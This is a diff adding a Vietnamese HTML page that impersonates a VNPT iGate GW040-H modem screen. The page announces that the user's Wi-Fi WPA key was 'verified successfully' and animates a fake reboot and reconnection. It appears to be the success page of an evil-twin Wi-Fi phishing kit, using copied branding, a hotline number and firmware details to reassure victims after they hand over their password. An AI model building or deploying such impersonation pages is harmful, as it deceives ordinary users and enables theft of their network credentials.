@@ -1,0 +1,109 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="vi">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>iGate GW040-H - Khôi Phục Thành Công</title>
+<style type="text/css">
+html, body { min-height: 100%; margin: 0; padding: 0; }
+body { text-align: center; background: #EBEBEB; font-size: 12px; color: #313131; font-family: "Microsoft YaHei", Arial, SimSun, Verdana, Helvetica, sans-serif; }
+body, form, h1, h3, h4, p, ul, ol { margin: 0; }
+
+#page_container { position: relative; width: 100%; max-width: 960px; margin: 0 auto; padding: 0 0 15px 0; text-align: left; background: #FFFFFF; box-shadow: 0 0 8px rgba(0,0,0,0.12); min-height: 100vh; display: flex; flex-direction: column; box-sizing: border-box; }
+
+#banner { width: 100%; height: 74px; background: #FFFFFF; display: flex; justify-content: space-between; align-items: center; padding: 0 20px; box-sizing: border-box; border-bottom: 1px solid #D0D8E4; }
+.logo-vnpt { display: flex; align-items: center; gap: 12px; }
+.logo-badge { background: #005baa; color: #fff; font-weight: bold; font-size: 17px; padding: 5px 13px; border-radius: 3px; letter-spacing: 1px; }
+.logo-sub { font-size: 13px; font-weight: bold; color: #003d7a; line-height: 1.4; }
+.logo-sub small { display: block; font-size: 11px; color: #7a97b8; font-weight: normal; }
+#banner_info { font-size: 12px; color: #27ae60; font-weight: bold; text-align: right; }
+
+.status-strip { background: #1f2d3d; color: #ccc; font-size: 11px; display: flex; gap: 18px; padding: 6px 20px; box-sizing: border-box; flex-wrap: wrap; }
+.led-item { display: flex; align-items: center; gap: 5px; }
+.led { width: 8px; height: 8px; border-radius: 50%; display: inline-block; }
+.led-green { background: #2ecc71; box-shadow: 0 0 4px #2ecc71; }
+.led-off   { background: #555; }
+
+#mainNavigator { width: 100%; height: 36px; line-height: 36px; background: #27ae60; display: flex; padding: 0 20px; box-sizing: border-box; gap: 2px; }
+#mainNavigator span { padding: 0 14px; color: #c8f5dc; font-size: 12px; font-weight: bold; cursor: default; display: inline-block; height: 100%; }
+#mainNavigator span.active { background: #ffffff; color: #1a7a45; border-top: 3px solid #27ae60; line-height: 33px; }
+
+#page_content { flex: 1; padding: 25px 20px; text-align: left; }
+
+#loginWrapper { max-width: 580px; margin: 10px auto; border: 1px solid #BCE5C8; background: #F5FBF7; border-radius: 3px; padding: 30px; box-sizing: border-box; text-align: center; }
+
+.succHint { color: #385401; background: #E7FFE4; border: 1px solid #BCE5B6; border-left: 4px solid #27ae60; padding: 13px 15px; margin-bottom: 20px; text-align: left; line-height: 1.6; }
+
+.progress-box { background: #E0E0E0; border-radius: 10px; height: 14px; overflow: hidden; margin: 18px 0 8px; border: 1px solid #C8D9C8; }
+.progress-bar { background: linear-gradient(to right, #005baa, #27ae60); height: 100%; width: 0%; }
+#status-text { font-size: 11px; color: #666; font-weight: bold; }
+
+#page_footer { height: 40px; line-height: 40px; text-align: left; background-color: #F4F4F4; padding: 0 20px; border-top: 1px solid #D7D7D7; font-size: 11px; color: #666; display: flex; justify-content: space-between; box-sizing: border-box; }
+</style>
+</head>
+<body>
+<div id="page_container">
+    <div id="banner">
+        <div class="logo-vnpt">
+            <span class="logo-badge">VNPT</span>
+            <div class="logo-sub">
+                iGate GW040-H — Optical Network Terminal
+                <small>Tập đoàn Bưu chính Viễn thông Việt Nam (VNPT)</small>
+            </div>
+        </div>
+        <div id="banner_info">✓ Đang khởi động lại thiết bị...</div>
+    </div>
+
+    <div class="status-strip">
+        <div class="led-item"><span class="led led-green"></span> PWR</div>
+        <div class="led-item"><span class="led led-green"></span> PON</div>
+        <div class="led-item"><span class="led led-off"></span>  LOS</div>
+        <div class="led-item"><span class="led led-green"></span> WLAN (OK)</div>
+        <div class="led-item"><span class="led led-green"></span> WAN (RECONNECTING)</div>
+    </div>
+
+    <div id="mainNavigator">
+        <span class="active">Cập Nhật Thành Công</span>
+    </div>
+
+    <div id="page_content">
+        <div id="loginWrapper">
+            <div style="font-size:42px;color:#27ae60;margin-bottom:10px;">✓</div>
+            <div style="font-size:16px;font-weight:bold;color:#1a5e35;margin-bottom:15px;">XÁC THỰC WPA KEY THÀNH CÔNG</div>
+
+            <div class="succHint">
+                Mật khẩu Wi-Fi (WPA Key) đã được xác nhận chính xác! Modem VNPT iGate GW040-H đang thực hiện khởi động lại mô-đun không dây và cập nhật địa chỉ WAN IP từ nhà mạng. Kết nối Internet của Quý khách sẽ tự động phục hồi trong chốc lát.
+            </div>
+
+            <div class="progress-box">
+                <div class="progress-bar" id="bar"></div>
+            </div>
+            <div id="status-text">Đang áp dụng cấu hình... (<span id="pct">0</span>%)</div>
+        </div>
+    </div>
+
+    <div id="page_footer">
+        <span>©2008-2026 VNPT Technology. All rights reserved. | Hotline kỹ thuật: <strong>18001166</strong></span>
+        <span>iGate GW040-H — Firmware G4.16A.02V2</span>
+    </div>
+</div>
+
+<script type="text/javascript">
+var w = 0;
+var bar = document.getElementById("bar");
+var pct = document.getElementById("pct");
+var st  = document.getElementById("status-text");
+var t = setInterval(function() {
+    if (w >= 100) {
+        clearInterval(t);
+        st.innerHTML = "Hoàn tất! Modem iGate đã khởi động — Internet đã kết nối lại.";
+    } else {
+        w += 2;
+        bar.style.width = w + "%";
+        pct.innerHTML = w;
+    }
+}, 150);
+</script>
+</body>
+</html>
